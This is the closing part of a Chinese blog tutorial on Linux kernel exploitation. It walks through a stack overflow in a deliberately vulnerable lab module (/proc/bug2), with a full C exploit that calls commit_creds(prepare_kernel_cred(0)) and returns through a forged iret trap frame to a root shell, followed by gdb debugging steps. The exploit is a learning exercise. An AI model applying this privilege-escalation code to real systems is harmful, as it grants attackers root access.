+<p>从内核模式赋予root权限commit_creds(prepare_kernel_cred(0))然后直接返回用户模式，并在用户模式启一个shell，拿到root shell，其中使用iret指令来返回。</p>
+<h3 id="iret简介"><a class="headerlink" href="#iret简介" title="iret简介"></a>iret简介</h3></blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">当使用IRET指令返回到相同保护级别的任务时，IRET会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。</div><div class="line"></div><div class="line">当使用IRET指令返回到一个不同的保护级别时，IRET不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。</div></pre></td></tr></table></figure>
+<h3 id="硬件在栈上保存了trap-frame，iret从下面的结构中恢复到用户模式"><a class="headerlink" href="#硬件在栈上保存了trap-frame，iret从下面的结构中恢复到用户模式" title="硬件在栈上保存了trap frame，iret从下面的结构中恢复到用户模式"></a>硬件在栈上保存了trap frame，iret从下面的结构中恢复到用户模式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> trap_frame </div><div class="line">{</div><div class="line">	<span class="keyword">void</span>* eip;				<span class="comment">// instruction pointer +0</span></div><div class="line">	<span class="keyword">uint32_t</span> cs;			<span class="comment">// code segment    +4</span></div><div class="line">	<span class="keyword">uint32_t</span> eflags;		<span class="comment">// CPU flags       +8</span></div><div class="line">	<span class="keyword">void</span>* esp;				<span class="comment">// stack pointer       +12</span></div><div class="line">	<span class="keyword">uint32_t</span> ss;			<span class="comment">// stack segment   +16</span></div><div class="line">} <span class="number">__</span>attribute__((packed));</div></pre></td></tr></table></figure>
+<h3 id="构造fake-trap-frame和用户模式shell"><a class="headerlink" href="#构造fake-trap-frame和用户模式shell" title="构造fake trap frame和用户模式shell"></a>构造fake trap frame和用户模式shell</h3><h4 id="构造fake-trap-frame-struct-trap-frame"><a class="headerlink" href="#构造fake-trap-frame-struct-trap-frame" title="构造fake trap frame(struct trap_frame)"></a>构造fake trap frame(struct trap_frame)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">		<span class="keyword">asm</span>(<span class="string">"pushl %cs; popl tf+4;"</span>	<span class="comment">//填充tf.cs为当前的cs</span></div><div class="line">		<span class="string">"pushfl; popl tf+8;"</span>		<span class="comment">//填充tf.eflags为当前的eflags</span></div><div class="line">		<span class="string">"pushl %esp; popl tf+12;"</span>	<span class="comment">//填充tf.esp为当前的esp</span></div><div class="line">		<span class="string">"pushl %ss; popl tf+16;"</span>);	<span class="comment">//填充tf.ss为当前的ss</span></div><div class="line">		tf.eip = &amp;launch_shell;		<span class="comment">//填充tf.eip为launch_shell</span></div><div class="line">		tf.esp -= <span class="number">1024</span>;		<span class="comment">//unused part of stack</span></div><div class="line">}</div></pre></td></tr></table></figure>
+<h4 id="用户模式shell"><a class="headerlink" href="#用户模式shell" title="用户模式shell"></a>用户模式shell</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></div><div class="line">{</div><div class="line">	execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</div><div class="line">}</div></pre></td></tr></table></figure>
+<h3 id="最终的exp和调试"><a class="headerlink" href="#最终的exp和调试" title="最终的exp和调试"></a>最终的exp和调试</h3><blockquote>
+<p>注意添加断点直接b bug2_write,通过commit_creds(prepare_kernel_cred(0))赋予root权限<br/>并通过iret从内核态直接返回用户态然后启动用户态的shell(launch_shell)此时得到的就是root shell</p>
+</blockquote>
+<h5 id="exp-1"><a class="headerlink" href="#exp-1" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></div><div class="line"><span class="keyword">struct</span> trap_frame{</div><div class="line">    <span class="keyword">void</span> *eip;</div><div class="line">    <span class="keyword">uint32_t</span> cs;</div><div class="line">    <span class="keyword">uint32_t</span> eflags;</div><div class="line">    <span class="keyword">void</span> *esp;</div><div class="line">    <span class="keyword">uint32_t</span> ss;</div><div class="line">}<span class="number">__</span>attribute__((packed));</div><div class="line"><span class="keyword">struct</span> trap_frame tf;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>{</div><div class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</div><div class="line">}</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>{</div><div class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span> <span class="comment">//set cs</span></div><div class="line">        <span class="string">"pushfl;popl tf+8;"</span>  <span class="comment">//set eflags</span></div><div class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></div><div class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</div><div class="line">    tf.eip = &amp;get_shell;</div><div class="line">    tf.esp -= <span class="number">1024</span>;</div><div class="line">}</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></div><div class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067c30</span>;</div><div class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067a90</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>{</div><div class="line">    <span class="comment">//payload here    </span></div><div class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</div><div class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></div><div class="line">       <span class="string">"iret;"</span>);</div><div class="line">}</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>{</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">24</span>];</div><div class="line">    <span class="built_in">memset</span>(buf,<span class="number">0x41</span>,<span class="number">24</span>);</div><div class="line">    *((<span class="keyword">void</span>**)(buf+<span class="number">20</span>)) = &amp;payload; <span class="comment">//set eip to payload</span></div><div class="line">    init_tf_work();</div><div class="line">    write(<span class="number">1</span>,buf,<span class="keyword">sizeof</span>(buf));</div><div class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug2"</span>,O_WRONLY);</div><div class="line">    <span class="comment">//exploit</span></div><div class="line">    write(fd,buf,<span class="keyword">sizeof</span>(buf));</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div></pre></td></tr></table></figure>
+<h6 id="3-调试exploit"><a class="headerlink" href="#3-调试exploit" title="3. 调试exploit"></a>3. 调试exploit</h6><p>先要做一些准备工作：</p>
+<ul>
+<li>确定模块代码节地址</li>
+</ul>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/47529411-file_1492093896561_aae6.png"/></p>
+<ul>
+<li>gdb设置</li>
+</ul>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/80798469-file_1492093989244_2fb3.png"/><br/>然后就可以返回到系统中，运行exploit程序了。</p>
+<p>对ret指令下断，然后c过去，这时候单步的话，应该就ret到我们payload的地址了。</p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/68093852-file_1492098164648_7eb3.png"/><br/>查看一下栈顶的情况：</p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/10481050-file_1492098183610_f2e1.png"/></p>
+<p>接下来，我们单步，直行进入我们的payload。</p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/91719404-file_1492098210807_5828.png"/></p>
+<p>这里可以看到先去执行<code>commit_creds(prepare_kernel_cred(0))</code>了。</p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/81992979-file_1492098238167_a8ad.png"/><br/><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/85791643-file_1492098270927_145d1.png"/></p>
+<p>我们主要关注iret的时候：</p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/85791643-file_1492098270927_145d1.png"/></p>
+<p>红色部分就是我们伪造的tf结构啦！</p>
+<p><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/1066069-file_1492098308885_159b4.png"/><br/><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/18249508-file_1492098327950_f58f.png"/></p>
+<p>这边可以看到eip指向是我们用来起shell的函数，这样看来整个payload结构是没什么问题的。</p>
+<h2 id="最终效果"><a class="headerlink" href="#最终效果" title="最终效果"></a>最终效果</h2><blockquote>
+<p>按write-linux-kernel-exploit-1文中——qemu中添加普通用户并测试<br/><img alt="" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/90619683-file_1492098345979_2d08.png"/></p>
+</blockquote>
+<h2 id="总结"><a class="headerlink" href="#总结" title="总结"></a>总结</h2><blockquote>
+<p>真实环境中，canary是启用的，一旦canary被覆盖，就会造成kernel panics</p>
+</blockquote>
+<h3 id="引用"><a class="headerlink" href="#引用" title="引用"></a>引用</h3><p><a href="https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf" rel="external" target="_blank">linux_kernel_exploit</a></p>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2017/04/10/write-kernel-exploits-2/">linux-kernel expoit  study (3)---栈溢出</a></p>
+<p><span>文章作者:</span><a href="/" title="访问 Swing|浮生若梦 的个人博客">Swing|浮生若梦</a></p>
+<p><span>发布时间:</span>2017年04月10日 - 00时00分</p>
+<p><span>最后更新:</span>2017年04月13日 - 23时48分</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2017/04/10/write-kernel-exploits-2/" title="linux-kernel expoit  study (3)---栈溢出">http://bestwing.me/2017/04/10/write-kernel-exploits-2/</a>
+<span class="copy-path" data-clipboard-text="原文: http://bestwing.me/2017/04/10/write-kernel-exploits-2/　　作者: Swing|浮生若梦" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/clipboard.min.js"></script>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="license" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<a class="article-nav-link-wrap" href="/2017/04/17/cstc-xatu-writeup/" id="article-nav-newer">
+<strong class="article-nav-caption">&lt;</strong>
+<div class="article-nav-title">
+        
+          第三届全国网络空间安全技术大赛(线上初赛)
+        
+      </div>
+</a>
+<a class="article-nav-link-wrap" href="/2017/04/08/write-kernel-exploits-1/" id="article-nav-older">
+<div class="article-nav-title">linux-kernel expoit  study (3)---NULL dereference</div>
+<strong class="article-nav-caption">&gt;</strong>
+</a>
+</nav>
+<!-- -- ���Ӿ���ͼ�� ---->
+<div class="post-donate">
+<div class="donate_bar center" id="donate_board">
+<a class="btn_donate" href="javascript:;" id="btn_donate" title="����"></a>
+<span class="donate_txt">
+           ↑<br/>
+		   如果觉得文章对你有用，不妨赏一点小钱吧！
+        </span>
+<br/>
+</div>
+<div class="donate_bar center hidden" id="donate_guide">
+<!-- ֧��������ͼ�� -->
+<img alt="֧��������" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/zhifubao.jpg"/>
+<!-- ΢�Ŵ���ͼ�� -->
+<img alt="΢�Ŵ���" src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/weixin.jpg"/>
+</div>
+<script type="text/javascript">
+		document.getElementById('btn_donate').onclick = function(){
+			$('#donate_board').addClass('hidden');
+			$('#donate_guide').removeClass('hidden');
+		}
+	</script>
+</div>
+<!-- -- ���Ӿ���ͼ�� ---->
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#write-linux-kernel-exploit-2"><span class="toc-number">1.</span> <span class="toc-text">write linux kernel exploit 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-smashing"><span class="toc-number">1.1.</span> <span class="toc-text">Stack smashing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一个简单的demo"><span class="toc-number">1.2.</span> <span class="toc-text">一个简单的demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的测试"><span class="toc-number">1.3.</span> <span class="toc-text">简单的测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试模块"><span class="toc-number">1.4.</span> <span class="toc-text">调试模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体调试步骤"><span class="toc-number">1.5.</span> <span class="toc-text">具体调试步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.6.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#iret简介"><span class="toc-number">1.6.1.</span> <span class="toc-text">iret简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#硬件在栈上保存了trap-frame，iret从下面的结构中恢复到用户模式"><span class="toc-number">1.6.2.</span> <span class="toc-text">硬件在栈上保存了trap frame，iret从下面的结构中恢复到用户模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造fake-trap-frame和用户模式shell"><span class="toc-number">1.6.3.</span> <span class="toc-text">构造fake trap frame和用户模式shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#构造fake-trap-frame-struct-trap-frame"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">构造fake trap frame(struct trap_frame)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#用户模式shell"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">用户模式shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最终的exp和调试"><span class="toc-number">1.6.4.</span> <span class="toc-text">最终的exp和调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp-1"><span class="toc-number">1.6.4.0.1.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-调试exploit"><span class="toc-number">1.6.4.0.1.1.</span> <span class="toc-text">3. 调试exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最终效果"><span class="toc-number">1.7.</span> <span class="toc-text">最终效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#引用"><span class="toc-number">1.8.1.</span> <span class="toc-text">引用</span></a></li></ol></li></ol></div></div></div></div></body></html>
+
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script src="./linux-kernel expoit  study (3)---栈溢出  Swings'Blog浮生若梦CTFerBinaryPython/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+<div class="share">
+<div class="bdsharebuttonbox">
+<a class="bds_more" data-cmd="more" href="#"></a>
+<a class="bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
+<a class="bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
+<a class="bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
+<a class="bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
+</div>
+<script>
+        window._bd_share_config={
+            "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+    </script>
+</div>
+<div class="bdsharebuttonbox">
+<a class="fx fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fx fa-weixin bds_weixin" data-cmd="weixin" href="#" title="分享到微信"></a>
+<a class="fx fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享到QQ好友"></a>
+<a class="fx fa-facebook-official bds_fbook" data-cmd="fbook" href="#" title="分享到Facebook"></a>
+<a class="fx fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到Twitter"></a>
+<a class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" href="#" title="分享到linkedin"></a>
+<a class="fx fa-files-o bds_copy" data-cmd="copy" href="#" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+<div class="duoshuo" id="comments">
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="2017/04/10/write-kernel-exploits-2/" data-title="linux-kernel expoit  study (3)---栈溢出" data-url="http://bestwing.me/2017/04/10/write-kernel-exploits-2/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    var duoshuoQuery = {short_name:"WinMin"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '/js/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+<!-- 多说公共JS代码 end -->
+</div>
+<div class="scroll" id="post-nav-button">
+<a href="/2017/04/17/cstc-xatu-writeup/" title="上一篇: 第三届全国网络空间安全技术大赛(线上初赛)">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2017/04/08/write-kernel-exploits-1/" title="下一篇: linux-kernel expoit  study (3)---NULL dereference">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/07/2017-SSCTF-Pwn/">2017- SSCTF-Pwn250</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/01/2017-defcon-peROPdo/">2017 DEFCON ---  peROPdo writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/2017-360chunqiu-online/">2017 360春秋杯线上 部分Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/after-upgrade-gdb-wont-attach-to-process/">解决升级pwntools  gdb.attach不能弹起gdb</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/17/cstc-xatu-writeup/">第三届全国网络空间安全技术大赛(线上初赛)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/write-kernel-exploits-2/">linux-kernel expoit  study (3)---栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/write-kernel-exploits-1/">linux-kernel expoit  study (3)---NULL dereference</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/add-a-system-call/">linux-kernel expoit  study (2)---添加系统调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/04/Complie-linux-kernel-and-running-it-using-qemu/">linux-kernel expoit  study（1） ---编译并用qemu运行内核</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/01/hoo_free/">Hook_free  解决保护全开的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/30/《程序员的自我修养》读书笔记/">《程序员的自我修养》读书笔记---ELF文件结构</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/29/2017-0CTF-部分Pwn/">2017年 0CTF---部分Pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/28/愿你出走半生，归来仍是少年/">不忘初心</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/26/markdown图片设置方法/">Markdown中对图片进行居中,设置大小等操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/24/stack-overflow-four/">基础栈溢出复习 四 之 BROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/stack-overflow-three/">基础栈溢出复习 三 之 SROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/19/stack-overflow-two/">基础栈溢出复习 二 之 ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/18/stack-overflow-one/">基础栈溢出复习 之基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/2017-NJCTF-part-writeup/">2017 XCTF 南京站　线上赛　NJCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/08/angr-study/">angr初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/28/ichunqiu-CTF-Pwn-2017-2/">i 春秋-CTF-Pwn-2017-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/python-沙箱-逃逸/">Python沙箱逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/15/Memory Leak &amp; DynELF/">leak技巧以及DynELF的温习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/13/WiFi_Attack/">蹭隔壁的WiFI</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/02/Those-of-the-Breakpoint/">断点的那些事</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/使用Git开发使用介绍/">使用Git开发使用介绍</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/Windows-Kernel-Exploit-Study-1/">Windows Kernel Exploit Study(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnable刷题日记/">pwnable刷题日记 第一阶梯部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/30/one-gadget-rce/">One gadget rce</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/15/CSRF-Preliminary-Study/">CSRF初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/23/ichuqiu-reverse-November/">ichunqiu百度杯-十一月reverse专题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/18/Second Shanghai college students ' network security competition/">第二届上海市大学生网络安全大赛 Re400</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/13/2016-SUCTF-Writeup-pwn/">2016-SUCTF-PWN-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/10/As-a-Software security engineer-must-know-and-read-books-recommended/">作为一个二进制安全学习者必知必读的书籍推荐</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/08/ichuqiu-pwn-November/">ichunqiu百度杯-十一月pwn专题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/22/基于zio的exp初次尝试/">一次基于zio编写pwn的exp的尝试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/16/2016-sycgeek-Writeup/">Sycsec-极客大挑战-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/29/2016-NUCA-pwn-Writeup/">NUCA---pwn-2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/The_hulling_method/">逆向学习——脱壳方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/18/tell_myself/">有时候想想 是得规划一下自己了</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/2016-Hs-ctf-SeeSea-writeup/">2016-中国·西安 华山杯 Writeup-SeeSea</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/10/Common types of RSA/">一大波RSA就要来了~~</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/08/2016-NUCA-Reverse-Writeup/">全国高校网安联赛--逆向篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/05/2016-ichunqiu-September/">百度杯 CTF夺旗大赛 ---ichunqiu</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/05/Want to say a bit/">一点想说的</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/27/John the Ripper password cracker/">John 破解rar 或者 zip密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/23/wooyun搭建/">记一次在服务器上wooyun搜索站的搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/ubuntu-mount-new-disk/">ubuntu系统新增硬盘空间</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/渗透测试/">这是一波 ichunqiu在线挑战攻略 -(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/29/记一次Hexo主题的修改/">记一次Hexo主题修改</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/27/CTF-Misc&amp;Crypto-Tools/">工具以及脚本的整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/i春秋30强部分通关指南/">i春秋30强部分write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/ichunqiu-Tencent-top30-Pwn/">ichunqiu-Pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/04/浅谈格式化字符串漏洞/">浅谈格式化字符串漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/24/利用阿里云搭建VPN/">利用阿里云搭建VPN</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/2016黑客西部大会/">2016黑客西部大会</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/28/2016-Networ-space-security-technology-competition-of-shaanxi/">陕西省网络空间安全技术大赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/26/2016-PCTF-Writup/">Phrack--CTF 整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/2015-CCTF-Writeup/">酱油之旅--CCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/14/Hexo-Use/">Hexo 使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/27/Hexo-Theme/">Hexo 主题：SPFK</a></li><li class="post-list-item"><a class="post-list-link" 